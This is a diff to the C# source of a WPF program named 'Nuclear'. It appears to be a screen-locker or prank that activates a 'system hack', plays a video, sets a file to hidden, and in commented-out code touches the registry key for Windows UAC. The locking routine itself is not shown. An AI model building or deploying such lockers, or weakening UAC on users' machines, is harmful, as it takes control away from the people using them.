@@ -16,9 +16,13 @@ namespace Nuclear
             //CheckUAC();
             InitializeComponent();
         }
+        //You can set your cancel condition
         private void Window_Closing(object sender, CancelEventArgs e)
         {
-            SystemHack.Disactivate();
+            if (File.Exists("filename")) File.Delete("filename");
+            SystemHack.Disactivate(); //discard system hack
+            System.Threading.Thread.Sleep(1000); 
+            Application.Current.Shutdown();
         }
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {  
@@ -27,7 +31,7 @@ namespace Nuclear
                 //you need to add video-media into Resource.resx file
                 if (File.Exists("filename")) File.Delete("filename");
                 //File.WriteAllBytes("filename", Resource.filename);
-                //File.SetAttributes("filename", FileAttributes.filename);
+                //File.SetAttributes("filename", FileAttributes.Hidden);
                 SystemHack.Activate(); //system hack
                 MedEl.Play(); //first media play
             }
@@ -42,14 +46,6 @@ namespace Nuclear
             MedEl.Stop();
             MedEl.Play();
         }
-
-        //unlock
-        /*
-                if (File.Exists("Czigan.avi")) File.Delete("Czigan.avi");
-                SystemHack.Disactivate(); //discard system hack
-                System.Threading.Thread.Sleep(1000); 
-                Application.Current.Shutdown();
-         */
         /*private void CheckUAC() //ask user to disable UAC :)
          {
              Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
